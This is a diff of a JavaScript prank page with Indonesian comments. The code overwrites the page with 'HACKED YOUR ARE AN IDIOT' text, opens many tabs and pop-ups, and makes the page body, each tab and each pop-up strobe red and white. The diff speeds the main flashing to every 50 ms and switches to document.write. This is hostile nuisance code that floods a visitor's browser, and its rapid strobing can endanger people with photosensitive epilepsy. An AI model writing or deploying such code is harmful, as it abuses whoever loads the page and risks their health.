@@ -21,7 +21,7 @@ function changeToHackerContent() {
     const mainContent = document.getElementById('main-content');
     if (mainContent) {
         mainContent.innerHTML = `
-            <h1 style="color: red; text-align: center;">HACKED YOUR ARE AN IDIOT!</h1>
+            <h1 style="color: red; text-align: center;">HACK YOUR ARE AN IDIOT HAHAHAHAH!</h1>
         `;
 
         // Tambahkan CSS untuk efek flashing
@@ -64,7 +64,7 @@ function openTabsAndPopUps(tabMultiplier, popUpMultiplier) {
 
 // Fungsi untuk menambahkan kedap-kedip pada body tab
 function addFlashingToTab(tab) {
-    tab.document.innerHTML = `
+    tab.document.write(`
         <html>
             <head>
                 <title>HACKED YOUR AN IDIOT HAHAHAHA!</title>
@@ -86,14 +86,14 @@ function addFlashingToTab(tab) {
                 <script>
                     let flash = false;
                     setInterval(() => {
-                        document.body.style.backgroundColor = flash ? 'black' : 'red';  
-                        document.body.style.color = flash ? 'red' : 'white';
+                        document.body.style.backgroundColor = flash ? 'white' : 'red';  
+                        document.body.style.color = flash ? 'red' : 'red';
                         flash = !flash;
-                    }, 100); // Kecepatan flashing sama dengan main content
+                    }, 100);
                 </script>
             </body>
         </html>
-    `;
+    `);
 }
 
 // Fungsi untuk membuat pop-up di dalam setiap tab
@@ -125,10 +125,10 @@ function createPopUps(tabWindow, multiplier) {
                         <script>
                             let flash = false;
                             setInterval(() => {
-                                document.body.style.backgroundColor = flash ? 'black' : 'red';  
-                                document.body.style.color = flash ? 'red' : 'white';
+                                document.body.style.backgroundColor = flash ? 'white' : 'red';  
+                                document.body.style.color = flash ? 'red' : 'red';
                                 flash = !flash;
-                            }, 100); // Kecepatan flashing sama dengan main content
+                            }, 100);
                         </script>
                     </body>
                 </html>
@@ -183,8 +183,8 @@ function setRandomPosition(popUp) {
 function startBackgroundFlashing() {
     let flash = false;
     setInterval(() => {
-        document.body.style.backgroundColor = flash ? 'black' : 'red';  
+        document.body.style.backgroundColor = flash ? 'white' : 'red';  
         document.body.style.color = flash ? 'red' : 'white';
         flash = !flash;
-    }, 100); // Kecepatan flashing yang sama
+    }, 50);
 }
